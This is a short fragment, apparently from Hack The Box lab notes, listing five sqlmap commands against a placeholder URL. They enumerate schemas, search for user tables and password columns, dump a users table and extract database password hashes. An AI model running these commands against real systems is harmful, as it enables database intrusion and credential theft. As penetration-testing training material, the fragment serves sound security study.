...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
